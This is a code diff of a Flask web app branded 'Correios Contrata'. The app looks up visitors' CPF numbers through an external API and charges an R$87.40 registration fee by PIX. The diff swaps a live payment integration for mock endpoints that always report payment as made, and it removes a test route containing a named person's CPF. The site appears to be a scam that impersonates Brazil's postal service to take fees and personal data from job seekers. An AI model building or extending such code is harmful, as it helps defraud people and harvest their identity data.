@@ -1,14 +1,12 @@
 import os
 import logging
 import requests
-import json
+import random
 from datetime import datetime, timedelta
 from flask import Flask, render_template, request, jsonify, make_response
-from flask.helpers import send_from_directory
 from flask_sqlalchemy import SQLAlchemy
 from flask_migrate import Migrate
 from sqlalchemy.orm import DeclarativeBase
-# from for4_payments import For4PaymentsAPI, PaymentRequestData, create_payment_api
 
 # Configure logging para produção
 logging.basicConfig(
@@ -20,8 +18,6 @@ class Base(DeclarativeBase):
     pass
 
 db = SQLAlchemy(model_class=Base)
-
-# FOR4 PAYMENTS API está implementada abaixo
 
 # Create the Flask app
 app = Flask(__name__)
@@ -334,9 +330,6 @@ def formulario_inscricao():
 @app.route('/validar-cpf', methods=['POST'])
 def validar_cpf():
     """Validate CPF and get user data from API"""
-    import requests
-    import random
-    from datetime import datetime, timedelta
     
     data = request.get_json()
     cpf = data.get('cpf', '').replace('.', '').replace('-', '')
@@ -463,148 +456,38 @@ def pagamento_pix():
 
 @app.route('/api/gerar-pix', methods=['POST'])
 def gerar_pix():
-    """Generate PIX payment using Nova Era API"""
-    try:
-        from nova_era_api import create_nova_era_client, Customer
-        
-        dados = request.get_json()
-        
-        # Validar dados obrigatórios
-        if not dados or not dados.get('valor'):
-            return jsonify({'success': False, 'message': 'Dados inválidos'}), 400
-        
-        # Validar dados recebidos
-        nome = dados.get('nome_pagador', '').strip()
-        email = dados.get('email_pagador', '').strip()
-        cpf = dados.get('cpf_pagador', '').strip()
-        telefone = dados.get('telefone', '').strip()
-        valor = dados.get('valor', 87.40)
-        
-        if not nome or not email or not cpf:
-            return jsonify({
-                'success': False, 
-                'message': 'Dados do usuário incompletos. Nome, email e CPF são obrigatórios.'
-            }), 400
-        
-        # Log dos dados recebidos para debug
-        app.logger.info(f"Gerando PIX Nova Era para: {nome}, {email}, CPF: {cpf[:3]}***")
-        
-        # Criar cliente da API
-        api = create_nova_era_client()
-        
-        # Criar objeto Customer
-        customer = Customer(
-            name=nome,
-            email=email,
-            phone=telefone or "(11) 99999-9999",  # Telefone padrão se não fornecido
-            cpf=cpf
-        )
-        
-        # Criar transação PIX
-        valor_centavos = int(valor * 100)  # Converter para centavos
-        descricao = dados.get('descricao', 'Taxa de Inscrição - Correios Contrata')
-        
-        transaction = api.create_pix_transaction(customer, valor_centavos, descricao)
-        
-        return jsonify({
-            'success': True,
-            'transacao_id': transaction.id,
-            'pix_code': transaction.qr_code,
-            'qr_code': transaction.qr_code,  # Compatibilidade
-            'status': transaction.status,
-            'expires_at': transaction.expires_at,
-            'valor': f"R$ {valor:.2f}",
-            'api_provider': 'Nova Era'
-        })
-        
-    except ValueError as e:
-        app.logger.error(f"Erro de validação: {e}")
-        return jsonify({'success': False, 'message': str(e)}), 400
-    except Exception as e:
-        app.logger.error(f"Erro ao gerar PIX Nova Era: {e}")
-        return jsonify({'success': False, 'message': f'Erro na API: {str(e)}'}), 500
+    """Generate PIX payment (mock for demo)"""
+    dados = request.get_json()
+    
+    # Return mock response for demonstration
+    return jsonify({
+        'success': True,
+        'transacao_id': 'demo-123456',
+        'pix_code': '00020126360014BR.GOV.BCB.PIX2514www.bcb.gov.br0514mock-pix-demo63040000',
+        'qr_code': '00020126360014BR.GOV.BCB.PIX2514www.bcb.gov.br0514mock-pix-demo63040000',
+        'status': 'pending',
+        'expires_at': '2025-07-31T23:59:59',
+        'valor': 'R$ 87,40',
+        'api_provider': 'Demo'
+    })
 
 @app.route('/api/verificar-pagamento/<string:transacao_id>')
 def verificar_pagamento(transacao_id):
-    """Verify PIX payment status using Nova Era API"""
-    try:
-        from nova_era_api import create_nova_era_client
-        
-        # Criar cliente da API
-        api = create_nova_era_client()
-        
-        # Verificar status do pagamento
-        status_data = api.get_transaction_status(transacao_id)
-        
-        return jsonify({
-            'pago': status_data['status'] == 'paid',
-            'status': status_data['status'],
-            'transacao_id': status_data['id'],
-            'valor': status_data['amount'],
-            'api_provider': 'Nova Era'
-        })
-        
-    except Exception as e:
-        app.logger.error(f"Erro ao verificar pagamento Nova Era: {e}")
-        return jsonify({'pago': False, 'message': str(e)}), 500
+    """Verify PIX payment status (mock for demo)"""
+    # Return mock payment verification for demonstration
+    return jsonify({
+        'pago': True,
+        'status': 'completed',
+        'transacao_id': transacao_id,
+        'api_provider': 'Demo'
+    })
 
 @app.route('/pagamento-confirmado')
 def pagamento_confirmado():
     """Payment confirmation page"""
     return render_template('pagamento_confirmado.html', page_title="Pagamento Confirmado - Correios Contrata")
 
-@app.route('/teste-pix')
-def teste_pix():
-    """Endpoint de teste para gerar PIX com Nova Era API"""
-    try:
-        from nova_era_api import create_nova_era_client, Customer
-        
-        # Criar cliente da API Nova Era
-        api = create_nova_era_client()
-        
-        # Criar objeto Customer com dados de teste
-        customer = Customer(
-            name="RIZIA REGIA DA SILVA RODRIGUES MAGALHAES",
-            email="rizia@teste.com",
-            phone="(11) 99999-9999",
-            cpf="011.011.011-05"
-        )
-        
-        # Criar transação PIX de teste
-        transaction = api.create_pix_transaction(
-            customer=customer,
-            amount=8740,  # R$ 87,40 em centavos
-            description="Taxa de Inscrição - Teste Nova Era"
-        )
-        
-        return jsonify({
-            'success': True,
-            'teste': True,
-            'api_provider': 'Nova Era',
-            'dados_enviados': {
-                'nome': customer.name,
-                'email': customer.email,
-                'cpf': customer.cpf,
-                'telefone': customer.phone,
-                'valor': 'R$ 87,40'
-            },
-            'resposta_api': {
-                'transacao_id': transaction.id,
-                'pix_code': transaction.qr_code,
-                'qr_code': transaction.qr_code,
-                'status': transaction.status,
-                'expires_at': transaction.expires_at,
-                'created_at': transaction.created_at
-            }
-        })
-        
-    except Exception as e:
-        app.logger.error(f"Erro no teste PIX: {e}")
-        return jsonify({
-            'success': False,
-            'error': str(e),
-            'teste': True
-        }), 500
+
 
 @app.route('/registro-sgte')
 def registro_sgte():
